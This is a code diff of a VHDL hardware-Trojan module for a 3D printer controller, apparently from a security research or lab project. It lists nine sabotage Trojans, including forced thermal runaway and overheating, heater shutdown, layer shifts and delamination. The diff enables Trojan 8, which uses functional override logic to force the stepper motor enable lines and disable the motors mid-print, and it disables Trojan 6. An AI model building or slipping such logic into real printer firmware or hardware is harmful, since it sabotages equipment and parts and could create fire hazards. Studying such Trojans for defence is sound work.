@@ -116,9 +116,9 @@ architecture Behavioral of Trojan_TOP is
     signal TROJ_T3_ENABLE : std_logic := '0'; -- Increases or decreases filament retraction between layers          -- DONE
     signal TROJ_T4_ENABLE : std_logic := '0'; -- Small Shift along X and Y axis on random Z layer increment         -- DONE
     signal TROJ_T5_ENABLE : std_logic := '0'; -- Forcing thermal runaway and further overheating                    -- DONE
-    signal TROJ_T6_ENABLE : std_logic := '1'; -- Denial of service via disabling D8/D10 heating element power       --
+    signal TROJ_T6_ENABLE : std_logic := '0'; -- Denial of service via disabling D8/D10 heating element power       -- DONE
     signal TROJ_T7_ENABLE : std_logic := '0'; -- Layer Delamination via Z-layer shift                               -- DONE
-    signal TROJ_T8_ENABLE : std_logic := '0'; -- Arbitrarily deactivating stepper motors via EN signals             --
+    signal TROJ_T8_ENABLE : std_logic := '1'; -- Arbitrarily deactivating stepper motors via EN signals             -- DONE
     signal TROJ_T9_ENABLE : std_logic := '0'; -- Arbitrarily reducing part fan speed mid-print                      --          
 
     type State_Type is (IDLE, STATE_1, STATE_2, STATE_3, STATE_4, STATE_5, DISABLE);
@@ -202,26 +202,26 @@ begin
     -- Modify these signals as needed
     o_LED       <= OUTPUT_LED;
 
---    o_D10       <= i_D10    ; -- Extruder
+    o_D10       <= i_D10    ; -- Extruder
     o_D9        <= i_D9     ; -- Fan
     o_D8        <= i_D8     ; -- Heat Bed
 
     o_E_DIR    <= i_E_DIR ;
-    o_E_EN     <= i_E_EN  ;
+--    o_E_EN     <= i_E_EN  ;
     o_E_STEP   <= i_E_STEP;   
 
     o_X_DIR     <= i_X_DIR  ;
-    o_X_EN      <= i_X_EN   ;   
+--    o_X_EN      <= i_X_EN   ;   
     o_X_MIN     <= i_X_MIN  ;
     o_X_STEP    <= i_X_STEP ;   
 
     o_Y_DIR     <= i_Y_DIR  ;
-    o_Y_EN      <= i_Y_EN   ;
+--    o_Y_EN      <= i_Y_EN   ;
     o_Y_MIN     <= i_Y_MIN  ;
     o_Y_STEP    <= i_Y_STEP ; 
 
     o_Z_DIR     <= i_Z_DIR  ;
-    o_Z_EN      <= i_Z_EN   ;
+--    o_Z_EN      <= i_Z_EN   ;
     o_Z_MIN     <= i_Z_MIN  ;            
     o_Z_STEP    <= i_Z_STEP ;
     
@@ -243,16 +243,16 @@ begin
 --     o_D8        <= i_D8  when TROJ_T5_ENABLE = '0' else (i_D8  or TROJ_T5_D8_MOD);
 
     -- Trojan 6 Related Signals 
-     o_D10       <= i_D10 when TROJ_T6_ENABLE = '0' else (i_D10 and TROJ_T6_D10_MOD);
+--     o_D10       <= i_D10 when TROJ_T6_ENABLE = '0' else (i_D10 and TROJ_T6_D10_MOD);
 
     -- Trojan 7 Related Signals 
 --    o_Z_STEP    <= i_Z_STEP when TROJ_T7_ENABLE = '0' else (i_Z_STEP or Z_STEP_MOD);
 
     -- Trojan 8 Related Signals 
-    -- o_E_EN    <= i_E_EN when TROJ_T8_ENABLE = '0' else (i__E_EN or TROJ_T8_E_EN_MOD); 
-    -- o_X_EN     <= i_X_EN  when TROJ_T8_ENABLE = '0' else (i__X_EN  or TROJ_T8_X_EN_MOD);
-    -- o_Y_EN     <= i_Y_EN  when TROJ_T8_ENABLE = '0' else (i__Y_EN  or TROJ_T8_Y_EN_MOD);
-    -- o_Z_EN     <= i_Z_EN  when TROJ_T8_ENABLE = '0' else (i__Z_EN  or TROJ_T8_Z_EN_MOD);
+     o_E_EN     <= i_E_EN  when TROJ_T8_ENABLE = '0' else (i_E_EN or TROJ_T8_E_EN_MOD); 
+     o_X_EN     <= i_X_EN  when TROJ_T8_ENABLE = '0' else (i_X_EN  or TROJ_T8_X_EN_MOD);
+     o_Y_EN     <= i_Y_EN  when TROJ_T8_ENABLE = '0' else (i_Y_EN  or TROJ_T8_Y_EN_MOD);
+     o_Z_EN     <= i_Z_EN  when TROJ_T8_ENABLE = '0' else (i_Z_EN  or TROJ_T8_Z_EN_MOD);
 
     -- Trojan 9 Related Signals  
 
@@ -522,7 +522,6 @@ begin
                     T6_NEXT_STATE <= STATE_3;
 
                 when STATE_3 => -- Endless Loop
-                    OUTPUT_LED <= '1';
                     T5_NEXT_STATE <= STATE_3;
 
                 when STATE_4 => T6_NEXT_STATE <= DISABLE; -- Unused
@@ -616,13 +615,14 @@ begin
                     end if;
 
                 when STATE_2 => 
-                    TROJ_T8_E_EN_MOD <= '1';
+                    TROJ_T8_E_EN_MOD  <= '1';
                     TROJ_T8_X_EN_MOD  <= '1';
                     TROJ_T8_Y_EN_MOD  <= '1';
                     TROJ_T8_Z_EN_MOD  <= '1';
                     T8_NEXT_STATE <= STATE_3;
 
                 when STATE_3 => -- Endless Loop
+                    OUTPUT_LED <= '1';
                     T8_NEXT_STATE <= STATE_3;
 
                 when STATE_4 => T8_NEXT_STATE <= DISABLE; -- Unused
